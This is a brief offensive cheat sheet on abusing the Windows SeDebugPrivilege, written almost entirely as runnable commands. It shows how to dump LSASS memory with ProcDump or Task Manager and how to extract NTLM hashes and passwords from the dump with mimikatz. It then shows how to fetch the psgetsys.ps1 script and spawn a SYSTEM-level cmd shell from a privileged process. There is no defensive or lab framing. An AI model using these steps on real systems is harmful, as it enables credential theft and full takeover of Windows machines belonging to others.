# SeDebugPrivilege

## automatic way with tools
### check priv
```bash
whoami /priv
 SeDebugPrivilege
```
### use ProcDump from the SysInternals suite to leverage privilege and dump process memory
```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
### gain the NTLM hash of the local administrator 
```bash
mimikatz.exe
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
```
## Manual way without tools
```bash
# Open task manager => Details => right clic lsass.exe => select 'Create dump file' => Use Mimikatz
```

## SeDebugPrivilege for RCE
```bash
transfer thisscript to the target
https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
check the process with :
 tasklist
Choose a process ID and launch this command :
 [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
exemple :
 psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612,"c:\Windows\System32\cmd.exe","")
That will open a cmd with NT system
could also use the Get-Process
 psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lssas").id,"c:\Windows\System32\cmd.exe","")
```








 
